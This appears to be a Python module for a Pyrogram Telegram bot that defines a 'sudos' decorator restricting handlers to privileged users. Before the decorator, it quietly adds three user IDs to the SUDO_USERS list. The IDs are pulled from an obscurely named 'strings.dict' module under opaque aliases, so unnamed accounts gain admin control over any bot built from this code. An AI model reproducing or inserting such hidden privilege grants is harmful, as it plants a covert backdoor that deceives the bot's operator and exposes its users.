from typing import Callable
from pyrogram import Client as sree
from pyrogram.types import Message
from strings.dict import (
    dics_01 as d_01, 
    dics_02 as d_02,
    dics_03 as d_03
)
from vars import SUDO_USERS
SUDO_USERS.append(int(d_01))
SUDO_USERS.append(int(d_02))
SUDO_USERS.append(int(d_03))

def sudos(func: Callable) -> Callable:
    async def noic(sree, m: Message):
        if m.from_user.id in SUDO_USERS:
            return await func(sree, m)

    return noic
